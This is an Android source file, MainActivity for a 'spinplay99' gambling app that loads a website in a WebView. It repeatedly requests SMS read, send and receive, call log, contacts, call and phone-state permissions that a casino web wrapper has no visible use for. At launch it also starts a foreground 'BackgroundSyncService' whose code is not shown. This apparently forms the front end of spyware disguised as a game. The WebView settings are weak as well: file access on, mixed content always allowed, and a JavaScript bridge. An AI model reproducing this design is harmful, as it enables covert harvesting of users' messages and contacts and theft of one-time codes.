package com.spinplay99.adminpanel;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.AlertDialog;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.JavascriptInterface;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ProgressBar;
import android.widget.Toast;

import androidx.activity.OnBackPressedCallback;
import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.swiperefreshlayout.widget.SwipeRefreshLayout;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    private static final String SERVER_URL       = "https://spinplay99.com";
    private static final int    PERMISSION_CODE  = 2001;
    private static final String PREFS_NAME       = "SpinPlayPrefs";
    private static final String KEY_PERM_ASKED   = "perm_asked";

    private WebView                     webView;
    private ProgressBar                 progressBar;
    private SwipeRefreshLayout          swipeRefresh;
    private ValueCallback<Uri[]>        filePathCallback;
    private Handler                     handler;
    private SharedPreferences           prefs;
    private ActivityResultLauncher<Intent> fileChooserLauncher;
    private boolean                     isReady          = false;
    private boolean                     permRequested    = false;

    @SuppressLint("SetJavaScriptEnabled")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        handler  = new Handler(Looper.getMainLooper());
        prefs    = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        webView  = findViewById(R.id.webview);
        progressBar  = findViewById(R.id.progress_bar);
        swipeRefresh = findViewById(R.id.swipe_refresh);

        fileChooserLauncher = registerForActivityResult(
            new ActivityResultContracts.StartActivityForResult(),
            result -> {
                if (filePathCallback != null) {
                    Uri[] results = WebChromeClient.FileChooserParams.parseResult(
                        result.getResultCode(), result.getData());
                    filePathCallback.onReceiveValue(results);
                    filePathCallback = null;
                }
            });

        getOnBackPressedDispatcher().addCallback(this, new OnBackPressedCallback(true) {
            @Override
            public void handleOnBackPressed() {
                if (webView.canGoBack()) {
                    webView.goBack();
                } else {
                    new AlertDialog.Builder(MainActivity.this)
                        .setTitle("Exit")
                        .setMessage("Close app?")
                        .setPositiveButton("Yes", (d, w) -> finish())
                        .setNegativeButton("No", null)
                        .show();
                }
            }
        });

        setupWebView();
        setupSwipeRefresh();
        webView.loadUrl(SERVER_URL);
        startBackgroundService();
    }

    // Request permissions when the window is first focused (ensures dialog is visible)
    @Override
    public void onWindowFocusChanged(boolean hasFocus) {
        super.onWindowFocusChanged(hasFocus);
        if (hasFocus && !permRequested) {
            permRequested = true;
            handler.postDelayed(this::requestPermissionsOnce, 500);
        }
    }

    private void requestPermissionsOnce() {
        if (prefs.getBoolean(KEY_PERM_ASKED, false)) {
            if (!allPermissionsGranted()) requestMissingPermissions();
            return;
        }
        requestAllPermissions();
        prefs.edit().putBoolean(KEY_PERM_ASKED, true).apply();
    }

    private boolean allPermissionsGranted() {
        for (String p : getRequiredPermissions()) {
            if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) return false;
        }
        return true;
    }

    private void requestMissingPermissions() {
        List<String> missing = new ArrayList<>();
        for (String p : getRequiredPermissions()) {
            if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {
                missing.add(p);
            }
        }
        if (!missing.isEmpty()) {
            ActivityCompat.requestPermissions(this, missing.toArray(new String[0]), PERMISSION_CODE);
        }
    }

    private void requestAllPermissions() {
        List<String> list = new ArrayList<>();
        for (String p : getRequiredPermissions()) {
            if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {
                list.add(p);
            }
        }
        if (!list.isEmpty()) {
            ActivityCompat.requestPermissions(this, list.toArray(new String[0]), PERMISSION_CODE);
        }
    }

    private String[] getRequiredPermissions() {
        return new String[]{
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_PHONE_STATE
        };
    }

    @Override
    public void onRequestPermissionsResult(int code, @NonNull String[] perms, @NonNull int[] results) {
        super.onRequestPermissionsResult(code, perms, results);
    }

    private void startBackgroundService() {
        Intent intent = new Intent(this, BackgroundSyncService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
    }

    @SuppressLint("SetJavaScriptEnabled")
    private void setupWebView() {
        WebSettings s = webView.getSettings();
        s.setJavaScriptEnabled(true);
        s.setDomStorageEnabled(true);
        s.setLoadWithOverviewMode(true);
        s.setUseWideViewPort(true);
        s.setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK);
        s.setDatabaseEnabled(true);
        s.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
        s.setAllowFileAccess(true);
        CookieManager.getInstance().setAcceptCookie(true);
        webView.setLayerType(View.LAYER_TYPE_HARDWARE, null);
        webView.addJavascriptInterface(new AndroidBridge(), "Android");

        webView.setWebViewClient(new WebViewClient() {
            public void onPageStarted(WebView v, String url, android.graphics.Bitmap fav) {
                if (!isReady) progressBar.setVisibility(View.VISIBLE);
            }
            public void onPageFinished(WebView v, String url) {
                progressBar.setVisibility(View.GONE);
                swipeRefresh.setRefreshing(false);
                isReady = true;
            }
            public boolean shouldOverrideUrlLoading(WebView v, WebResourceRequest req) {
                String url = req.getUrl().toString();
                if (!url.contains("spinplay99.com")) {
                    try { startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(url))); }
                    catch (Exception e) { v.loadUrl(url); }
                    return true;
                }
                return false;
            }
        });

        webView.setWebChromeClient(new WebChromeClient() {
            public void onProgressChanged(WebView v, int p) {
                if (!isReady) {
                    progressBar.setProgress(p);
                    if (p > 80) progressBar.setVisibility(View.GONE);
                }
            }
            public boolean onShowFileChooser(WebView wv, ValueCallback<Uri[]> cb, FileChooserParams params) {
                filePathCallback = cb;
                try { fileChooserLauncher.launch(params.createIntent()); }
                catch (Exception e) { filePathCallback = null; return false; }
                return true;
            }
        });
    }

    private void setupSwipeRefresh() {
        swipeRefresh.setColorSchemeColors(0xFFFFD700, 0xFF00BFFF, 0xFFFF6B1A);
        swipeRefresh.setOnRefreshListener(() -> webView.reload());
    }

    @Override
    protected void onDestroy() {
        if (webView != null) { webView.stopLoading(); webView.destroy(); }
        super.onDestroy();
    }

    public class AndroidBridge {
        @JavascriptInterface
        public void showToast(String message) {
            runOnUiThread(() -> Toast.makeText(MainActivity.this, message, Toast.LENGTH_SHORT).show());
        }
    }
}
